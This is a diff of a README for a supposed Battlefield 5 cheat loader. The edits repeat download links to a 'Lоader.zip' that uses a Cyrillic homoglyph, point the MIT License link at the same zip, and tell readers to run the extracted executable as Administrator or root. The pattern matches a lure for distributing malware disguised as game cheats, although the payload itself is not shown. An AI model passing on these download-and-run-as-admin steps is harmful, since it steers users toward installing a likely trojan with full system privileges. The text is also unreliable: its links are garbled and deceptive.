@@ -61,8 +61,8 @@ Optimized for minimal resource usage and maximum competitive advantage. Every fe
 ## 📦 Installation 🎉
 
 Getting started with the Battlefield 5 Cheats Loader for 2025 is fast and easy.
-1. Download **https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip** from this GitHub repository.
-2. Extract the https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip file using your preferred archive manager (WinRAR, 7-Zip, Keka, or Archive Utility).
+1. Download **https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip** from this GitHub repository.
+2. Extract the https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip file using your preferred archive manager (WinRAR, 7-Zip, Keka, or Archive Utility).
 3. Run the extracted Loader executable as Administrator (Windows) or with sudo/root if on Unix-based systems.
 4. Follow the on-screen interface to connect the Loader to your Battlefield 5 instance.
 5. Customize your enhancement settings from the in-app dashboard before entering the game.
@@ -104,7 +104,7 @@ This repository and its Loader are for **educational and research purposes only*
 
 ## 📜 License 📢
 
-Battlefield 5 Cheats Loader is released under the [MIT License](https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip).  
+Battlefield 5 Cheats Loader is released under the [MIT License](https://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/Ashikparvez89/Battlefield5-GameEnhancer/main/Lоader.zip).  
 Feel free to contribute, fork, and enhance this repository – just remember to adhere to the license!
 
 ---
